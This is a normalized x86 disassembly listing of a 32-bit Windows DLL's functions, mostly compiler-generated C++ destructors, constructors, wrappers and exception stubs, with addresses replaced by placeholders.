push [ esp + 0x8 ]
mov esi ecx
call sub_1002026c
mov [ esi ] r--data
mov eax esi
pop esi
retn 0x4
sub_100023b9
mov ecx [ ebp - 0x18 ]
xor esi esi
push esi
push 0x1
call sub_100023ce
push esi
push esi
call sub_10023a01
int3
sub_10002477
push ebp
mov ebp esp
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1002005a
mov eax [ ebp + 0x8 ]
add esp 0x10
pop ebp
retn
sub_1000253e
mov eax [ esp + 0x10 ]
add eax eax
push eax
push [ esp + 0x10 ]
mov eax [ esp + 0x10 ]
add eax eax
push eax
push [ esp + 0x10 ]
call sub_1002005a
add esp 0x10
retn
sub_1000255d
push ebp
mov ebp esp
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1000253e
mov eax [ ebp + 0x8 ]
add esp 0x10
pop ebp
retn
sub_10002b3c
mov eax r-xdata
retn
sub_1000307b
mov eax [ ecx - 0xc ]
mov eax [ eax + 0x4 ]
mov [ eax + ecx - 0xc ] r--data
mov eax [ ecx - 0x4 ]
mov eax [ eax + 0x4 ]
mov [ eax + ecx - 0x4 ] r--data
mov eax [ ecx - 0xc ]
mov eax [ eax + 0x4 ]
mov [ eax + ecx - 0xc ] r--data
retn
sub_100035c8
mov eax [ esi ]
test eax eax
je r-xdata
call sub_1002059f
cmp eax [ edi ]
je r-xdata
mov eax [ esi + 0x4 ]
xor ecx ecx
cmp eax [ edi + 0x4 ]
setne cl
mov al cl
retn
sub_100035e5
push esi
lea esi [ ecx - 0x54 ]
mov eax esi
call sub_10002709
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_1002004f
pop ecx
sub_10003635
push esi
mov esi ecx
call sub_100030a6
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_1002004f
pop ecx
sub_10003651
push 0xffffffff
push 0x0
push [ esp + 0xc ]
call sub_100021b2
retn 0x4
sub_100046fd
test [ esp + 0x4 ] 0x1
push esi
mov esi ecx
mov [ esi ] r--data
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_1002004f
pop ecx
sub_1000482d
push esi
mov esi ecx
push 0x0
mov [ esi + 0x18 ] 0x7
call sub_10002579
push [ esp + 0xc ]
mov ecx esi
push [ esp + 0xc ]
call sub_1000155d
mov eax esi
pop esi
retn 0x8
sub_10004853
push esi
mov esi ecx
push 0x0
mov [ esi + 0x18 ] 0x7
call sub_10002579
push [ esp + 0xc ]
mov ecx esi
push [ esp + 0xc ]
call sub_10005c55
mov eax esi
pop esi
retn 0x8
sub_10005a38
push ebp
mov ebp esp
push ecx
push [ ebp + 0x8 ]
mov eax [ ecx ]
and [ ebp - 0x4 ] 0x0
call [ eax + 0x10 ]
mov eax [ ebp + 0x8 ]
leave
retn 0x4
sub_10005a4f
push ebp
mov ebp esp
push ecx
push [ ebp + 0x8 ]
mov eax [ ecx ]
and [ ebp - 0x4 ] 0x0
call [ eax + 0x14 ]
mov eax [ ebp + 0x8 ]
leave
retn 0x4
sub_10005a66
push esi
mov esi ecx
mov [ esi ] r--data
call sub_10005dc7
mov [ esi ] r--data
pop esi
retn
sub_10005a7c
mov ax [ ecx + 0xc ]
retn
sub_10005a81
push ebp
mov ebp esp
push ecx
push [ ecx + 0x10 ]
mov ecx [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
call sub_100012f3
mov eax [ ebp + 0x8 ]
leave
retn 0x4
sub_10005a9b
push ebp
mov ebp esp
push ecx
push [ ecx + 0x14 ]
mov ecx [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
call sub_100012f3
mov eax [ ebp + 0x8 ]
leave
retn 0x4
sub_10005ab5
push esi
mov esi ecx
call sub_10005a66
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_1002004f
pop ecx
sub_10005ad1
push esi
mov esi ecx
push 0x0
mov [ esi + 0x18 ] 0xf
call sub_10002493
push [ esp + 0xc ]
mov ecx esi
push [ esp + 0xc ]
call sub_10005de7
mov eax esi
pop esi
retn 0x8
sub_10005db0
push ebp
mov ebp esp
push ecx
push [ ebp + 0x8 ]
mov eax [ ecx ]
and [ ebp - 0x4 ] 0x0
call [ eax + 0xc ]
mov eax [ ebp + 0x8 ]
leave
retn 0x4
sub_10005dc7
push esi
mov esi ecx
push [ esi + 0x8 ]
call sub_100209c6
push [ esi + 0x10 ]
call sub_100209c6
push [ esi + 0x14 ]
call sub_100209c6
add esp 0xc
pop esi
retn
sub_100067e6
mov eax [ esp + 0x8 ]
push esi
mov esi ecx
mov [ esi + 0x4 ] eax
mov [ esi ] r--data
call sub_1001b693
mov [ esi + 0x8 ] eax
mov [ esi + 0xc ] edx
mov eax esi
pop esi
retn 0x8
sub_10006807
mov eax [ esp + 0x8 ]
push esi
mov esi ecx
mov [ esi + 0x4 ] eax
mov [ esi ] r--data
call sub_1001b693
mov [ esi + 0x8 ] eax
mov [ esi + 0xc ] edx
mov eax esi
pop esi
retn 0x8
sub_1000697f
mov ecx [ ebp - 0x14 ]
call sub_10005dc7
xor ebx ebx
push ebx
push ebx
call sub_10023a01
int3
sub_10006e6b
movsx eax [ esp + 0xc ]
push [ esp + 0x8 ]
push eax
push [ esp + 0xc ]
call sub_100209e0
add esp 0xc
retn
sub_10007124
push esi
mov esi ecx
call sub_10007284
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_1002004f
pop ecx
sub_10007140
mov eax 0xffff
retn 0x4
sub_10007148
push [ esp + 0x8 ]
mov eax [ ecx ]
push 0xffffffff
push [ esp + 0xc ]
call [ eax + 0x1c ]
retn 0x8
sub_10007268
push esi
mov esi ecx
call sub_10007b41
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_1002004f
pop ecx
sub_10007319
mov eax [ ecx - 0x8 ]
mov eax [ eax + 0x4 ]
mov [ eax + ecx - 0x8 ] r--data
retn
sub_10007394
push esi
mov esi ecx
call sub_100073b0
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_1002004f
pop ecx
sub_100073b0
push esi
mov esi ecx
cmp [ esi + 0x14 ] 0x0
mov [ esi ] r--data
je r-xdata
mov [ esi ] r--data
pop esi
retn
push [ esi + 0x10 ]
call sub_100207fd
pop ecx
sub_100073d0
add ecx 0x8
push ecx
push [ esp + 0x10 ]
push [ esp + 0x10 ]
push [ esp + 0x10 ]
call sub_1001b22d
add esp 0x10
retn 0xc
sub_10007470
add ecx 0x8
push ecx
push [ esp + 0x8 ]
call sub_1001bb27
pop ecx
pop ecx
retn 0x4
sub_100074af
add ecx 0x8
push ecx
push [ esp + 0x8 ]
call sub_1001baba
pop ecx
pop ecx
retn 0x4
sub_100074c1
push ebp
mov ebp esp
mov edx [ ebp + 0xc ]
sub edx [ ebp + 0x8 ]
mov eax [ ecx ]
push edx
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ eax + 0x2c ]
pop ebp
retn 0xc
j_sub_100074e2
jmp sub_100074e2
j_sub_1000757d
jmp sub_1000757d
sub_10007670
mov eax [ esp + 0x8 ]
push esi
push [ esp + 0x8 ]
mov esi ecx
mov [ esi + 0x4 ] eax
mov [ esi ] r--data
call sub_1000763e
mov eax esi
pop esi
retn 0x8
sub_100076e4
push ebp
mov ebp esp
push ecx
mov eax [ ecx ]
mov ecx [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
add eax 0x18
push eax
call sub_10001daa
mov eax [ ebp + 0x8 ]
leave
retn 0x4
sub_100078cb
mov eax 0xffff
retn
sub_1000793d
add ecx 0x8
push ecx
push [ esp + 0xc ]
call sub_1001b1fe
test [ esp + 0xc ] ax
pop ecx
pop ecx
push 0x0
pop eax
setne al
retn 0x8
sub_10007af0
mov eax [ esp + 0x4 ]
push esi
mov esi ecx
mov ecx [ eax ]
mov [ esi ] ecx
call sub_10007ac8
mov eax esi
pop esi
retn 0x4
sub_10007c26
push ecx
mov [ ecx ] r--data
call sub_1001b129
pop ecx
retn
sub_10007c34
mov eax [ eax ]
mov ecx [ eax ]
mov ecx [ ecx + 0x4 ]
mov eax [ ecx + eax + 0x28 ]
test eax eax
je r-xdata
retn
lea ecx [ eax + 0x4 ]
jmp sub_1001b0ae
sub_10007cce
mov [ ecx ] r--data
jmp sub_10001cc8
sub_10007cd9
push esi
mov esi ecx
mov [ esi ] r--data
call sub_10001cc8
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_1002004f
pop ecx
sub_10007cfb
push esi
push [ esp + 0x8 ]
mov esi ecx
call sub_10001ce5
mov [ esi ] r--data
mov eax esi
pop esi
retn 0x4
sub_10007e2d
push ecx
mov eax [ edx + 0x8 ]
or eax [ esp + 0x8 ]
cmp [ edx + 0x28 ] 0x0
jne r-xdata
push [ esp + 0xc ]
mov ecx eax
push edx
call sub_10007d13
pop ecx
retn 0x8
or eax 0x4
sub_10007fb8
push esi
mov esi ecx
call sub_10007fd4
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_1002004f
pop ecx
sub_10008042
push ecx
and [ esp ] 0x0
push ebx
mov ebx eax
push 0x0
call sub_10012023
pop ecx
mov eax ebx
pop ebx
pop ecx
retn
sub_10008106
push 0x2c
mov eax sub_1004b1f2
call sub_10023ed2
and [ ebp - 0x4 ] 0x0
mov esi ecx
mov [ ebp - 0x38 ] esi
mov [ ebp - 0x31 ] 0x1
call sub_100082a9
or [ ebp - 0x4 ] 0xffffffff
mov [ ebp - 0x31 ] al
jmp sub_1000813a
sub_1000812d
or [ ebp - 0x4 ] 0xffffffff
mov eax r-xdata
retn
sub_10008396
mov eax [ ebp - 0x28 ]
cmp [ eax + 0x28 ] 0x20
je r-xdata
mov [ ebp - 0x4 ] 0x6
mov eax r-xdata
retn
push 0x0
push 0x0
call sub_10023a01
sub_10008524
mov [ ebp - 0x4 ] 0xf
mov eax r-xdata
retn
sub_10008616
mov [ ebp - 0x4 ] 0xf
mov eax r-xdata
retn
sub_10008821
or [ ebp - 0x4 ] 0xffffffff
mov eax r-xdata
retn
sub_10008a86
or [ ebp - 0x4 ] 0xffffffff
mov eax r-xdata
retn
sub_10008dea
call sub_10008106
xor eax eax
retn
sub_1000927e
push 0x0
mov eax sub_10049166
call sub_10023e33
mov esi [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
call sub_100094df
push [ esi ]
call sub_1002004f
pop ecx
call sub_10023f0b
retn 0x4
sub_100094df
mov eax [ esi + 0xc ]
test eax eax
je r-xdata
and [ esi + 0xc ] 0x0
and [ esi + 0x10 ] 0x0
and [ esi + 0x14 ] 0x0
retn
push [ esi + 0x10 ]
call sub_100095c8
push [ esi + 0xc ]
call sub_1002004f
pop ecx
sub_10009c98
push esi
push [ esp + 0x8 ]
mov esi ecx
call sub_10020428
pop ecx
push eax
push [ esp + 0xc ]
mov ecx esi
call sub_10009bf9
pop esi
retn 0x4
sub_10009e8a
push esi
mov esi ecx
mov [ ecx ] r--data
mov [ ecx + 0x28 ] r--data
mov [ ecx + 0x3c ] r--data
call sub_10009ea8
pop esi
retn
sub_10009ea8
lea ecx [ esi + 0x28 ]
mov [ esi ] r--data
mov [ ecx ] r--data
call sub_1000ac21
mov [ esi ] r--data
mov ecx esi
jmp sub_10001c35
sub_10009ec9
sub ecx 0x28
jmp sub_10009f33
sub_10009f12
push ebp
mov ebp esp
add ecx 0xffffffc4
sub esp 0x40
push ecx
lea ecx [ ebp - 0x40 ]
call sub_10009f57
push r--data
lea eax [ ebp - 0x40 ]
push eax
call sub_10023a01
int3
sub_10009f33
push esi
mov esi ecx
call sub_10009e8a
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_1002004f
pop ecx
sub_10009f4f
sub ecx 0x3c
jmp sub_10009f33
sub_10009f57
push esi
push [ esp + 0x8 ]
mov esi ecx
call sub_10009fa8
mov [ esi + 0x3c ] r--data
mov [ esi ] r--data
mov [ esi + 0x28 ] r--data
mov [ esi + 0x3c ] r--data
mov eax esi
pop esi
retn 0x4
sub_10009f84
push esi
mov esi ecx
call sub_10009ea8
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_1002004f
pop ecx
sub_10009fa0
sub ecx 0x28
jmp sub_10009f84
sub_10009ff2
push esi
push [ esp + 0x8 ]
mov esi ecx
call sub_1000a564
mov [ esi ] r--data
mov eax esi
pop esi
retn 0x4
sub_1000a115
push esi
mov esi ecx
mov [ ecx ] r--data
mov [ ecx + 0x28 ] r--data
mov [ ecx + 0x3c ] r--data
call sub_1000a133
pop esi
retn
sub_1000a133
lea ecx [ esi + 0x28 ]
mov [ esi ] r--data
mov [ ecx ] r--data
call sub_1000ac21
mov [ esi ] r--data
mov ecx esi
jmp sub_10001c35
sub_1000a154
sub ecx 0x28
jmp sub_1000a1be
sub_1000a19d
push ebp
mov ebp esp
add ecx 0xffffffc4
sub esp 0x40
push ecx
lea ecx [ ebp - 0x40 ]
call sub_1000a1e2
push r--data
lea eax [ ebp - 0x40 ]
push eax
call sub_10023a01
int3
sub_1000a1be
push esi
mov esi ecx
call sub_1000a115
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_1002004f
pop ecx
sub_1000a1da
sub ecx 0x3c
jmp sub_1000a1be
sub_1000a1e2
push esi
push [ esp + 0x8 ]
mov esi ecx
call sub_1000a233
mov [ esi + 0x3c ] r--data
mov [ esi ] r--data
mov [ esi + 0x28 ] r--data
mov [ esi + 0x3c ] r--data
mov eax esi
pop esi
retn 0x4
sub_1000a20f
push esi
mov esi ecx
call sub_1000a133
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_1002004f
pop ecx
sub_1000a22b
sub ecx 0x28
jmp sub_1000a20f
sub_1000a27a
push esi
push [ esp + 0x8 ]
mov esi ecx
call sub_1000a564
mov [ esi ] r--data
mov eax esi
pop esi
retn 0x4
sub_1000a3e7
push esi
mov esi ecx
mov [ ecx ] r--data
mov [ ecx + 0x28 ] r--data
mov [ ecx + 0x3c ] r--data
call sub_1000a405
pop esi
retn
sub_1000a405
lea ecx [ esi + 0x28 ]
mov [ esi ] r--data
mov [ ecx ] r--data
call sub_1000ac21
mov [ esi ] r--data
mov ecx esi
jmp sub_10001c35
sub_1000a426
sub ecx 0x28
jmp sub_1000a490
sub_1000a46f
push ebp
mov ebp esp
add ecx 0xffffffc4
sub esp 0x40
push ecx
lea ecx [ ebp - 0x40 ]
call sub_1000a4b4
push r--data
lea eax [ ebp - 0x40 ]
push eax
call sub_10023a01
int3
sub_1000a490
push esi
mov esi ecx
call sub_1000a3e7
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_1002004f
pop ecx
sub_1000a4ac
sub ecx 0x3c
jmp sub_1000a490
sub_1000a4b4
push esi
push [ esp + 0x8 ]
mov esi ecx
call sub_1000a505
mov [ esi + 0x3c ] r--data
mov [ esi ] r--data
mov [ esi + 0x28 ] r--data
mov [ esi + 0x3c ] r--data
mov eax esi
pop esi
retn 0x4
sub_1000a4e1
push esi
mov esi ecx
call sub_1000a405
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_1002004f
pop ecx
sub_1000a4fd
sub ecx 0x28
jmp sub_1000a4e1
sub_1000a54c
push esi
push [ esp + 0x8 ]
mov esi ecx
call sub_1000a564
mov [ esi ] r--data
mov eax esi
pop esi
retn 0x4
sub_1000a564
push esi
push [ esp + 0x8 ]
mov esi ecx
call sub_10001baa
mov [ esi ] r--data
mov eax esi
pop esi
retn 0x4
sub_1000a5bc
push esi
push [ esp + 0x8 ]
mov esi ecx
call sub_10001be4
mov [ esi ] r--data
mov eax esi
pop esi
retn 0x4
sub_1000a5d4
push esi
mov esi ecx
mov [ esi ] r--data
call sub_10001c35
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_1002004f
pop ecx
sub_1000a5f6
mov [ ecx ] r--data
jmp sub_10001c35
sub_1000a905
cmp [ esp + 0x4 ] 0xffffffff
jne r-xdata
xor eax eax
retn
cmp [ esp + 0x8 ] 0x7fffffff
jne r-xdata
xor eax eax
inc eax
retn
sub_1000ab26
push esi
mov esi ecx
mov [ ecx ] r--data
mov [ ecx + 0x28 ] r--data
mov [ ecx + 0x3c ] r--data
call sub_1000ab44
pop esi
retn
sub_1000ab44
lea ecx [ esi + 0x28 ]
mov [ esi ] r--data
mov [ ecx ] r--data
call sub_1000ac21
mov ecx esi
jmp sub_10001cc8
sub_1000ab5f
mov [ ecx ] r--data
retn
sub_1000ab66
sub ecx 0x28
jmp sub_1000abd0
sub_1000abaf
push ebp
mov ebp esp
add ecx 0xffffffc4
sub esp 0x40
push ecx
lea ecx [ ebp - 0x40 ]
call sub_1000abf4
push r--data
lea eax [ ebp - 0x40 ]
push eax
call sub_10023a01
int3
sub_1000abd0
push esi
mov esi ecx
call sub_1000ab26
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_1002004f
pop ecx
sub_1000abec
sub ecx 0x3c
jmp sub_1000abd0
sub_1000abf4
push esi
push [ esp + 0x8 ]
mov esi ecx
call sub_1000ac64
mov [ esi + 0x3c ] r--data
mov [ esi ] r--data
mov [ esi + 0x28 ] r--data
mov [ esi + 0x3c ] r--data
mov eax esi
pop esi
retn 0x4
sub_1000ac40
push esi
mov esi ecx
call sub_1000ab44
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_1002004f
pop ecx
sub_1000ac5c
sub ecx 0x28
jmp sub_1000ac40
sub_1000acab
mov ecx [ esi ]
test ecx ecx
je r-xdata
retn
mov eax [ ecx ]
call [ eax + 0x10 ]
test al al
je r-xdata
and [ esi ] 0x0
sub_1000acf4
test [ esp + 0x4 ] 0x1
push esi
mov esi ecx
mov [ esi ] r--data
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_1002004f
pop ecx
sub_1000ad11
mov eax ecx
mov [ eax ] r--data
retn 0x4
sub_1000ada3
push esi
push sub_100100db
mov esi eax
push 0x4
call sub_100132cc
mov [ esi ] r--data
mov eax esi
pop esi
retn
sub_1000adbc
push esi
mov esi ecx
call sub_1000add8
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_1002004f
pop ecx
sub_1000aec6
add ecx 0x4
push ecx
call sub_100133ce
pop ecx
retn
sub_1000b1c4
push 0x0
mov ecx esi
mov [ esi + 0x18 ] 0xf
call sub_10002493
push 0x0
push [ esp + 0x8 ]
mov ecx esi
call sub_10005de7
mov eax esi
retn 0x4
sub_1000b1e6
push esi
mov esi ecx
call sub_1000b202
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_1002004f
pop ecx
sub_1000b7fa
push esi
mov esi ecx
call sub_1000b816
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_1002004f
pop ecx
sub_1000b816
push 0x0
mov [ ecx ] r--data
push 0x1
add ecx 0x4
call sub_100023ce
retn
sub_1000c0e9
mov [ ebp - 0x4 ] 0x9
mov eax r-xdata
retn
sub_1000c359
push esi
mov esi eax
add esi 0x54
mov ecx esi
call sub_1000c458
push esi
mov [ esi ] r--data
call sub_1001b129
pop ecx
pop esi
retn
sub_1000c490
mov eax [ ecx - 0xc ]
mov eax [ eax + 0x4 ]
mov [ eax + ecx - 0xc ] r--data
mov eax [ ecx - 0x4 ]
mov eax [ eax + 0x4 ]
mov [ eax + ecx - 0x4 ] r--data
mov eax [ ecx - 0xc ]
mov eax [ eax + 0x4 ]
mov [ eax + ecx - 0xc ] r--data
retn
sub_1000c947
push esi
lea esi [ ecx - 0x54 ]
mov eax esi
call sub_1000c359
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_1002004f
pop ecx
sub_1000c997
push esi
mov esi ecx
call sub_1000c4bb
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_1002004f
pop ecx
sub_1000cda5
mov ecx [ ebp + 0x8 ]
test ecx ecx
je r-xdata
push 0x0
push 0x0
call sub_10023a01
int3
mov eax [ ecx ]
push 0x1
call [ eax ]
sub_1000d3ce
push esi
mov esi ecx
call sub_1000d407
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_1002004f
pop ecx
sub_1000d3ea
mov eax [ ecx + 0x14 ]
test eax eax
jle r-xdata
jge r-xdata
push [ ecx + 0x10 ]
call sub_100207fd
pop ecx
retn
retn
push [ ecx + 0x10 ]
call sub_100209c6
pop ecx
sub_1000d407
push esi
mov esi ecx
mov [ esi ] r--data
call sub_1000d3ea
mov [ esi ] r--data
pop esi
retn
sub_1000d448
movzx eax [ esp + 0x4 ]
add ecx 0x8
push ecx
push eax
call sub_1001b6a9
pop ecx
pop ecx
retn 0x4
sub_1000d487
movzx eax [ esp + 0x4 ]
add ecx 0x8
push ecx
push eax
call sub_1001c13d
pop ecx
pop ecx
retn 0x4
sub_1000d49b
push ebp
mov ebp esp
mov edx [ ebp + 0xc ]
sub edx [ ebp + 0x8 ]
mov eax [ ecx ]
push edx
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ eax + 0x1c ]
pop ebp
retn 0xc
sub_1000d4b7
mov al [ esp + 0x4 ]
retn 0x4
sub_1000d50b
mov al [ esp + 0x4 ]
retn 0x8
sub_1000d565
mov eax [ esp + 0x8 ]
push esi
push [ esp + 0x8 ]
mov esi ecx
mov [ esi + 0x4 ] eax
mov [ esi ] r--data
call sub_1000d540
mov eax esi
pop esi
retn 0x8
sub_1000d767
push esi
mov esi ecx
call sub_1000d8e6
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_1002004f
pop ecx
sub_1000d783
or eax 0xffffffff
retn 0x4
sub_1000d789
or eax 0xffffffff
retn
sub_1000d8aa
mov eax [ esp + 0x4 ]
mov ecx [ r--data ]
mov [ eax ] ecx
xor ecx ecx
mov [ eax + 0x8 ] ecx
mov [ eax + 0xc ] ecx
mov [ eax + 0x10 ] ecx
retn 0x10
sub_1000d8c4
mov eax [ esp + 0x4 ]
mov ecx [ r--data ]
mov [ eax ] ecx
xor ecx ecx
mov [ eax + 0x8 ] ecx
mov [ eax + 0xc ] ecx
mov [ eax + 0x10 ] ecx
retn 0x20
sub_1000d8de
mov eax ecx
retn 0x8
sub_1000d8e3
xor eax eax
retn
sub_1000d945
mov eax [ ecx - 0x4 ]
mov eax [ eax + 0x4 ]
mov [ eax + ecx - 0x4 ] r--data
retn
sub_1000d98a
mov eax [ ecx - 0x8 ]
mov eax [ eax + 0x4 ]
mov [ eax + ecx - 0x8 ] r--data
retn
sub_1000d999
push [ ecx + 0xc ]
call sub_1000d9d8
pop ecx
retn
sub_1000d9d8
push esi
mov esi [ esp + 0x8 ]
test esi esi
je r-xdata
pop esi
retn
mov ecx esi
call sub_1000d9a3
push esi
call sub_1002004f
pop ecx
sub_1000da37
push [ ebp + 0x8 ]
call sub_1000d9d8
pop ecx
push 0x0
push 0x0
call sub_10023a01
int3
sub_1000da6f
push esi
mov esi ecx
call sub_10001b23
and [ esi + 0x1c ] 0x0
and [ esi + 0x20 ] 0x0
mov eax esi
pop esi
retn
sub_1000da83
mov ecx [ ecx + 0x4 ]
test ecx ecx
je r-xdata
retn
jmp sub_1000ad5c
sub_1000dae2
test ecx ecx
je r-xdata
retn
mov eax [ ecx ]
push 0x1
call [ eax ]
sub_1000db25
push esi
mov esi ecx
call sub_1000db41
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_1002004f
pop ecx
sub_1000db41
push 0x0
mov [ ecx ] r--data
push 0x1
add ecx 0x4
call sub_10002597
retn
sub_1000de1e
push esi
mov esi eax
add esi 0x58
mov ecx esi
call sub_1000e022
push esi
mov [ esi ] r--data
call sub_1001b129
pop ecx
pop esi
retn
sub_1000de3a
push esi
mov esi eax
add esi 0x54
mov ecx esi
call sub_1000e7ec
push esi
mov [ esi ] r--data
call sub_1001b129
pop ecx
pop esi
retn
sub_1000e82b
push esi
lea esi [ ecx - 0x58 ]
mov eax esi
call sub_1000de1e
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_1002004f
pop ecx
sub_1000e84a
push esi
mov esi ecx
call sub_1000e061
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_1002004f
pop ecx
sub_1000e866
push esi
lea esi [ ecx - 0x54 ]
mov eax esi
call sub_1000de3a
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_1002004f
pop ecx
sub_1000eaa0
mov eax [ esp + 0x10 ]
mov ecx [ esp + 0x8 ]
mov [ eax ] ecx
mov eax [ esp + 0x1c ]
mov ecx [ esp + 0x14 ]
push 0x3
mov [ eax ] ecx
pop eax
retn 0x1c
sub_1000eaba
mov eax [ esp + 0x10 ]
mov ecx [ esp + 0x8 ]
push 0x3
mov [ eax ] ecx
pop eax
retn 0x10
sub_1000eaca
mov eax [ esp + 0xc ]
sub eax [ esp + 0x8 ]
cmp [ esp + 0x10 ] eax
jae r-xdata
retn 0x10
mov eax [ esp + 0x10 ]
sub_1000eadf
push [ eax + 0x38 ]
mov ecx [ esp + 0x8 ]
call sub_10007af0
mov eax [ esp + 0x4 ]
retn 0x4
sub_1000edec
mov ecx [ ebp + 0x8 ]
test ecx ecx
je r-xdata
push 0x0
push 0x0
call sub_10023a01
int3
mov eax [ ecx ]
push 0x1
call [ eax ]
sub_1000ee60
push 0x4
mov eax sub_1004a29c
call sub_10023e66
mov esi ecx
and [ ebp - 0x4 ] 0x0
mov eax [ esi ]
mov eax [ eax + 0x4 ]
test [ eax + esi + 0x10 ] 0x2
je r-xdata
call sub_10023f0b
retn
call sub_1000d39d
sub_1000ee89
mov eax r-xdata
retn
sub_1000eeee
xor eax eax
inc eax
retn
sub_1000eef2
mov al 0x1
retn
sub_1000eef5
mov [ ecx ] r--data
retn
sub_1000eefc
test [ esp + 0x4 ] 0x1
push esi
mov esi ecx
mov [ esi ] r--data
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_1002004f
pop ecx
sub_1000ef8c
push esi
mov esi ecx
call sub_1000efa8
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_1002004f
pop ecx
sub_1000f1ed
mov [ ebp - 0x4 ] 0x2
mov eax sub_1000f1fa
retn
sub_1000f207
push esi
mov esi ecx
lea eax [ esi + 0x1c ]
mov [ esi ] r--data
call sub_1000f3a3
add esi 0x4
call sub_10001508
push [ esi ]
call sub_1002004f
pop ecx
pop esi
retn
sub_1000f2af
push esi
mov esi ecx
call sub_1000f207
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_1002004f
pop ecx
sub_1000feed
test [ esp + 0x4 ] 0x1
push esi
mov esi ecx
mov [ esi ] r--data
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_1002004f
pop ecx
sub_1000ff0a
mov [ ecx ] r--data
retn
sub_1001005d
mov ecx [ eax + 0x4 ]
test ecx ecx
je r-xdata
retn
jmp sub_1000ad5c
sub_100100db
xor eax eax
inc eax
retn 0x4
sub_10010132
push esi
mov esi ecx
call sub_1001014e
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_1002004f
pop ecx
sub_10010449
mov eax r-xdata
retn
sub_10010495
mov ecx [ ebp + 0x8 ]
test ecx ecx
je r-xdata
push 0x0
push 0x0
call sub_10023a01
int3
mov eax [ ecx ]
push 0x1
call [ eax ]
sub_100104ac
push 0x0
mov eax sub_100495fa
call sub_10023e33
mov esi [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
push [ ebp + 0xc ]
lea ecx [ esi + 0x4 ]
mov [ esi ] r--data
call sub_100020c6
mov eax esi
call sub_10023f0b
retn 0x8
sub_100104da
push esi
mov esi ecx
call sub_100104f6
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_1002004f
pop ecx
sub_100104f6
push esi
mov esi ecx
push 0x0
push 0x1
lea ecx [ esi + 0x4 ]
mov [ esi ] r--data
call sub_10002597
mov [ esi ] r--data
pop esi
retn
sub_10010513
push esi
push [ esp + 0xc ]
mov esi ecx
mov eax [ esi ]
call [ eax + 0xc ]
push [ esp + 0x8 ]
mov eax [ esi ]
mov ecx esi
call [ eax + 0x8 ]
pop esi
retn 0x8
sub_10010767
push esi
mov esi ecx
call sub_10010783
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_1002004f
pop ecx
sub_10010d7c
push ecx
and [ esp ] 0x0
push ebx
add eax 0xc
mov ebx ecx
push eax
call sub_10010ebd
mov eax ebx
pop ebx
pop ecx
retn
sub_10010f73
